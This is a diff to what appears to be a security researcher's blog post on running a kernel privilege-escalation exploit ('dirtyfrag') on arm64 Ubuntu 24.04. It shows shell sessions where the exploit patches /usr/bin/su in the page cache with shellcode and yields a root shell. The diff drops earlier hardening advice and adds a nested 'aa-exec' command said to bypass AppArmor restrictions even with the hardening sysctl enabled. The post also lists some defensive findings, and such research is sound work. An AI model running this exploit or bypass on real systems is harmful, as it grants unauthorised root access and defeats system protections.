@@ -41,10 +41,13 @@ A user logged in via SSH:
 ```bash
 ubuntu@devbox:~$ cat /proc/sys/kernel/apparmor_restrict_unprivileged_userns
 1
+
 ubuntu@devbox:~$ cat /proc/sys/kernel/apparmor_restrict_unprivileged_unconfined
 0
+
 ubuntu@devbox:~$ cat /proc/self/attr/apparmor/current
 unconfined
+
 ubuntu@devbox:~$ ./dirtyfrag_arm64 --force-esp
 [su] uid_map: Operation not permitted
 [su] corruption stage failed (status=0x100)
@@ -60,8 +63,10 @@ ubuntu@devbox:~$ aa-exec -p runc -- env DIRTYFRAG_VERBOSE=1 /tmp/dirtyfrag_arm64
 [su] installed 53 xfrm SAs
 [su] wrote 212 bytes to /usr/bin/su starting at 0x0
 [su] /usr/bin/su page-cache patched (entry 0x78 = shellcode)
+
 # cat /proc/self/attr/apparmor/current
 runc//null-/tmp/dirtyfrag_arm64//null-/usr/bin/su//null-/usr/bin/dash//null-/usr/bin/cat (complain)
+
 # id
 uid=0(root) gid=0(root) groups=0(root)
 ```
@@ -83,7 +88,13 @@ ubuntu@jump-bastion-2b-065c5b:~/dirtyfrag-arm64/test$ aa-exec -p runc -- env DIR
 dirtyfrag: failed (rc=1)
 ```
 
-On servers, I would consider enabling kernel.apparmor_restrict_unprivileged_unconfined=1 after (lots of) testing. It closes the aa-exec profile-transition bypass class I used here, and Ubuntu recommends it as an additional hardening step for releases where it is not already enabled. There is probably better existing documentation on this at other sites than I can provide here.
+**Update:** There is a double profile-transition bypass that still works:
+
+```bash
+aa-exec -p crun -- aa-exec -p crun -- env DIRTYFRAG_VERBOSE=1 /tmp/dirtyfrag_arm64 --force-esp
+```
+
+This succeeds even with `kernel.apparmor_restrict_unprivileged_unconfined=1`. See my follow-up post [Two Hops and a Shell](/posts/two-hops-and-a-shell) for details. The single `aa-exec` path shown above is blocked, but the nested transition is not.
 
 ### AWS SSM
 
@@ -292,8 +303,9 @@ tl;dr:
 - The arm64 port required payload/data changes, not exploit logic changes.
 - The rxrpc path kernel oopsed on arm64 in my testing, leaving the ESP path as the viable route.
 - Direct ESP exploitation from a normal unconfined SSH shell was blocked by Ubuntu 24.04's AppArmor unprivileged-userns restriction.
-- That block was bypassable on my tested image by transitioning into an existing complain-mode AppArmor profile with `aa-exec` while `kernel.apparmor_restrict_unprivileged_unconfined=0`.
-- Setting `kernel.apparmor_restrict_unprivileged_unconfined=1` blocked the profile-transition path in my testing.
+- ~~That block was bypassable on my tested image by transitioning into an existing complain-mode AppArmor profile with `aa-exec` while `kernel.apparmor_restrict_unprivileged_unconfined=0`~~
+- ~~Setting `kernel.apparmor_restrict_unprivileged_unconfined=1` blocked the profile-transition path in my testing~~
+- That block was bypassable via AppArmor profile transition. A single `aa-exec` works when `unconfined=0`. A nested double `aa-exec` works even with `unconfined=1`. See [follow-up post](/posts/two-hops-and-a-shell).
 - SSM was not special it was just one access path that already started inside a complain-mode snap AppArmor profile.
 - Removing read permissions from SUID binaries (`chmod o-r`) blocks this splice-based page-cache attack class against those SUID binary targets.
 - Event-based FIM is blind to this page-cache modification. Periodic hashing can detect it only during the contamination window.
